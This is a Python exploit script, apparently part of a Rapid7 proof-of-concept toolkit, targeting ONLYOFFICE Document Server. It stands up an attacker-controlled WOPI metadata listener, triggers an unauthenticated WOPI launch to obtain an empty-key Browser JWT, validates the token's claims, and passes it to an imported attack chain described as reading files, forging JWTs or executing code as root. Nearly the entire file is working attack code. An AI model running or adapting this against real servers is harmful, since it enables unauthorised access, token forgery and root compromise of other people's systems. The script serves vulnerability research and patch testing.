#!/usr/bin/env python3
"""Use an unauthenticated WOPI launch to read files, forge a JWT or execute as root."""

import argparse
import json
import threading
from http.server import BaseHTTPRequestHandler
from pathlib import Path
from urllib.parse import parse_qs, urlsplit

from onlyoffice_chain import Chain, add_chain_args
from onlyoffice_common import (
    DocumentServer,
    ExploitError,
    ListenerServer,
    add_network_args,
    decode_jwt,
    entrypoint,
    http_url,
    network_options,
    port_number,
    status,
)


class WopiSource:
    def __init__(self, host: str, port: int, public_url: str, cert: Path | None, key: Path | None):
        self.path = urlsplit(public_url).path
        self.requests = 0
        owner = self
        metadata = json.dumps(
            {
                "BaseFileName": "document.docx",
                "Size": 1,
                "Version": "1",
                "OwnerId": "rapid7",
                "UserId": "rapid7",
                "UserFriendlyName": "Rapid7",
                "UserCanWrite": True,
                "SupportsLocks": False,
                "SupportsUpdate": True,
            }
        ).encode()

        class Handler(BaseHTTPRequestHandler):
            def setup(self):
                super().setup()
                self.connection.settimeout(10)

            def log_message(self, _format, *_args):
                pass

            def do_GET(self):
                request = urlsplit(self.path)
                tokens = parse_qs(request.query, keep_blank_values=True).get("access_token")
                if request.path != owner.path or tokens != [""]:
                    self.send_error(404)
                    return
                owner.requests += 1
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(metadata)))
                self.send_header("Connection", "close")
                self.end_headers()
                self.wfile.write(metadata)

        self.server = ListenerServer((host, port), Handler, cert, key)
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)

    def __enter__(self):
        self.thread.start()
        return self

    def __exit__(self, *_args):
        self.server.shutdown()
        self.server.server_close()
        self.thread.join(timeout=5)


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    add_network_args(parser)
    add_chain_args(parser)
    parser.add_argument("--public-wopi-src", required=True, help="target-reachable metadata URL, ending in /")
    parser.add_argument("--listen-host", default="0.0.0.0", help="local WOPI bind address")
    parser.add_argument("--listen-port", type=port_number, default=18084, help="local WOPI bind port")
    parser.add_argument(
        "--tls-cert", type=Path, help="listener certificate; omit when TLS terminates at a proxy"
    )
    parser.add_argument("--tls-key", type=Path, help="listener private key")
    args = parser.parse_args()
    options = network_options(args)
    public_url = http_url(args.public_wopi_src, "--public-wopi-src")
    if not urlsplit(public_url).path.endswith("/"):
        raise ExploitError("--public-wopi-src must end in / for the empty-key WOPI entry")
    if bool(args.tls_cert) != bool(args.tls_key):
        raise ExploitError("--tls-cert and --tls-key must be supplied together")
    if args.tls_cert and urlsplit(public_url).scheme != "https":
        raise ExploitError("a TLS listener requires an HTTPS --public-wopi-src")
    with Chain(args) as chain, DocumentServer(**options) as client:
        with WopiSource(
            args.listen_host, args.listen_port, public_url, args.tls_cert, args.tls_key
        ) as source:
            status(f"[*] WOPI listener on {args.listen_host}:{args.listen_port}; public URL {public_url}")
            if urlsplit(public_url).scheme == "https" and not args.tls_cert:
                status("[*] public HTTPS URL requires TLS termination forwarding to this HTTP listener")
            token = client.launch_wopi(public_url)
        claims = decode_jwt(token)
        user = claims.get("userAuth")
        if (
            claims.get("key") != ""
            or not isinstance(user, dict)
            or user.get("mode") != "edit"
            or user.get("wopiSrc") != public_url
            or source.requests < 1
        ):
            raise ExploitError("target did not issue the exploitable empty-key Browser JWT")
        status("[+] unauthenticated WOPI launch returned an empty-key Browser JWT")
        return chain.run(client, token)


if __name__ == "__main__":
    entrypoint(main)
